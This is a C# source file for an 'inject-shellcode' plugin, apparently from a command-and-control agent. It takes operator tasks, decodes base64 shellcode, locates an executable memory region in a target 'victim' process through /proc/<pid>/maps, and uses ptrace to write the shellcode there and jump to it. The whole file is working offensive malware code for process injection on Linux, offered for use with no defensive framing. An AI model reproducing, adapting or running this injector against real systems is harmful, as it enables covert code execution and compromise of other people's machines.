using Agent.Interfaces;
using Agent.Models;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Agent.Utilities;
using Microsoft.Win32.SafeHandles;
using System.Text.Json;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "inject-shellcode";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private ISpawner spawner { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
            this.spawner = spawner;
        }

        public async Task Execute(ServerJob job)
        {
            Console.WriteLine(job.task.parameters);
            InjectArgs args = JsonSerializer.Deserialize<InjectArgs>(job.task.parameters);

            if (!args.Validate(out var message))
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = message,
                    completed = true,
                    status = "error"
                });
                return;
            }

            //Create new process
            byte[] buf = Misc.Base64DecodeToByteArray(args.asm);

            int pidMax = GetProcPidMax();
            //long victimPid = Convert.ToInt64(args[0]);
            long victimPid = (long)args.pid;
            if (victimPid == 0 || victimPid > pidMax)
            {
                messageManager.WriteLine("Argument not a valid number. Aborting.", job.task.id, true, "error");
                return;
            }

            long address = ParseMapsFile(victimPid);
            if (address < 0)
            {
                messageManager.WriteLine("Could not find an executable mapping. Aborting.", job.task.id, true, "error");
                return;
            }

            messageManager.WriteLine($"[*] Injecting payload at address 0x{address:X}.", job.task.id, false);
            var injector = new LinuxShellcodeInjector(new LinuxPtraceNative());
            if (!injector.Inject(victimPid, address, buf))
            {
                messageManager.WriteLine(
                    $"Failed to {injector.FailedOperation}: {injector.LastError}",
                    job.task.id,
                    true,
                    "error");
                return;
            }

            messageManager.WriteLine("[*] Successfully injected and jumped to the code.", job.task.id, true);


        }
        const int PID_MAX = 32768;
        const int PID_MAX_STR_LENGTH = 64;


        private int GetProcPidMax()
        {
            string pidMaxFilePath = "/proc/sys/kernel/pid_max";

            try
            {
                using (StreamReader pidMaxFile = new StreamReader(pidMaxFilePath))
                {
                    return int.Parse(pidMaxFile.ReadToEnd());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading {pidMaxFilePath}: {ex.Message}");
                Console.WriteLine("Using default.");
                return PID_MAX;
            }
        }

        private string GetPermissionsFromLine(string line)
        {
            int firstSpace = -1;
            int secondSpace = -1;

            for (int i = 0; i < line.Length; i++)
            {
                if (line[i] == ' ' && firstSpace == -1)
                {
                    firstSpace = i + 1;
                }
                else if (line[i] == ' ' && firstSpace != -1)
                {
                    secondSpace = i;
                    break;
                }
            }

            if (firstSpace != -1 && secondSpace != -1 && secondSpace > firstSpace)
            {
                return line.Substring(firstSpace, secondSpace - firstSpace);
            }

            return null;
        }

        private long GetAddressFromLine(string line)
        {
            int addressLastOccurrenceIndex = -1;

            for (int i = 0; i < line.Length; i++)
            {
                if (line[i] == '-')
                {
                    addressLastOccurrenceIndex = i;
                }
            }

            if (addressLastOccurrenceIndex == -1)
            {
                Console.WriteLine($"Could not parse address from line '{line}'. Aborting.");
                return -1;
            }

            string addressLine = line.Substring(0, addressLastOccurrenceIndex);
            return Convert.ToInt64(addressLine, 16);
        }

        private long ParseMapsFile(long victimPid)
        {
            string mapsFileName = $"/proc/{victimPid}/maps";

            try
            {
                using (StreamReader mapsFile = new StreamReader(mapsFileName))
                {
                    string line;
                    while ((line = mapsFile.ReadLine()) != null)
                    {
                        string permissions = GetPermissionsFromLine(line);

                        if (permissions == null)
                        {
                            continue;
                        }
                        else if (permissions.StartsWith("r-xp"))
                        {
                            Console.WriteLine($"[*] Found section mapped with {permissions} permissions.");
                            return GetAddressFromLine(line);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error opening {mapsFileName} file: {ex.Message}");
            }

            return -1;
        }
    }
}
